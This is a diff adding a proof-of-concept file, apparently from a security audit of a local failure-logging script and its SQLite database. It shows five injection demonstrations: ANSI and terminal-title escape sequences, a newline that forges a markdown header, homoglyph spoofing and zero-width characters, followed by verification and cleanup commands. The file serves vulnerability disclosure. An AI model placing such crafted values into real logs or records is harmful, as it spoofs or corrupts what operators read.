@@ -1,0 +1,127 @@
+================================================================================
+PROOF OF CONCEPT DEMONSTRATIONS
+================================================================================
+
+This file contains copy-paste commands to reproduce each vulnerability.
+
+================================================================================
+POC #1: ANSI Escape Sequence Injection
+================================================================================
+
+# Inject red-colored text that will appear in logs and terminal
+export FAILURE_TITLE=$'\033[31m'CRITICAL ERROR$'\033[0m Normal Text'
+export FAILURE_DOMAIN="poc"
+export FAILURE_SUMMARY="ANSI injection demonstration"
+export FAILURE_SEVERITY="5"
+./scripts/record-failure.sh
+
+# Verify - this will show "1B" (ESC character) in hex
+sqlite3 memory/index.db "SELECT hex(title) FROM learnings ORDER BY id DESC LIMIT 1;"
+
+# Expected: Contains "1B5B33316D" = ESC[31m (red color)
+# RESULT: VULNERABLE - ESC sequences stored
+
+# Attack scenario: An attacker could inject red text to make benign entries
+# look critical, cursor repositioning to overwrite log entries, or terminal
+# reset sequences to corrupt displays.
+
+================================================================================
+POC #2: CRLF Injection / Markdown Structure Manipulation
+================================================================================
+
+# Inject a fake markdown header to break document structure
+export FAILURE_TITLE="Innocent Title"$'\n'"## INJECTED ADMIN SECTION"
+export FAILURE_DOMAIN="poc"
+export FAILURE_SUMMARY="CRLF injection POC"
+export FAILURE_SEVERITY="5"
+./scripts/record-failure.sh
+
+# Check the markdown file
+ls -t memory/failures/*.md | head -1 | xargs cat
+
+# Expected: Markdown contains "## INJECTED ADMIN SECTION" as a real header
+# RESULT: VULNERABLE - Document structure compromised
+
+================================================================================
+POC #3: Terminal Title Hijacking
+================================================================================
+
+# Inject OSC sequence to set terminal title
+export FAILURE_TITLE=$'\033]0;SYSTEM COMPROMISED\007'Benign
+export FAILURE_DOMAIN="poc"
+export FAILURE_SUMMARY="Terminal control injection"
+export FAILURE_SEVERITY="3"
+./scripts/record-failure.sh
+
+# Verify ESC character stored
+sqlite3 memory/index.db "SELECT hex(title) FROM learnings ORDER BY id DESC LIMIT 1;"
+
+# Expected: Contains "1B5D30" = ESC]0 (OSC sequence)
+# RESULT: VULNERABLE - Terminal control sequences stored
+
+================================================================================
+POC #4: Unicode Homoglyph Spoofing
+================================================================================
+
+# Use Cyrillic A (U+0410) instead of Latin A (U+0041)
+export FAILURE_TITLE="Аdministrator Action"
+export FAILURE_DOMAIN="poc"
+export FAILURE_SUMMARY="Homoglyph spoofing"
+export FAILURE_SEVERITY="3"
+./scripts/record-failure.sh
+
+# Store legitimate entry
+export FAILURE_TITLE="Administrator Action"
+export FAILURE_DOMAIN="poc"
+export FAILURE_SUMMARY="Legitimate entry"
+export FAILURE_SEVERITY="3"
+./scripts/record-failure.sh
+
+# Check for duplicates - they look identical but have different hex
+sqlite3 memory/index.db "SELECT id, title FROM learnings WHERE domain='poc' ORDER BY id DESC LIMIT 2;"
+
+# RESULT: VULNERABLE - Creates duplicate-looking entries
+
+================================================================================
+POC #5: Zero-Width Character Steganography
+================================================================================
+
+# Inject zero-width characters between normal text
+export FAILURE_TITLE="Secret"$'\u200B'"Message"
+export FAILURE_DOMAIN="poc"
+export FAILURE_SUMMARY="Invisible character injection"
+export FAILURE_SEVERITY="3"
+./scripts/record-failure.sh
+
+# Search won't find it
+sqlite3 memory/index.db "SELECT COUNT(*) FROM learnings WHERE title='SecretMessage';"
+# Returns: 0 (not found because of invisible chars)
+
+# RESULT: VULNERABLE - Invisible characters stored
+
+================================================================================
+VERIFICATION QUERIES
+================================================================================
+
+# Count total vulnerable records
+sqlite3 memory/index.db "SELECT COUNT(*) as total FROM learnings WHERE domain IN ('poc', 'encoding-test');"
+
+# List vulnerable entries
+sqlite3 memory/index.db "SELECT id, substr(title, 1, 40) FROM learnings WHERE domain IN ('poc', 'encoding-test') ORDER BY id DESC LIMIT 10;"
+
+================================================================================
+CLEANUP (After Testing)
+================================================================================
+
+# Remove test data
+sqlite3 memory/index.db "DELETE FROM learnings WHERE domain IN ('poc', 'encoding-test');"
+rm -f memory/failures/20251201_*
+
+================================================================================
+CONCLUSION
+================================================================================
+
+All POCs demonstrate REAL, EXPLOITABLE vulnerabilities.
+IMMEDIATE REMEDIATION REQUIRED.
+
+================================================================================
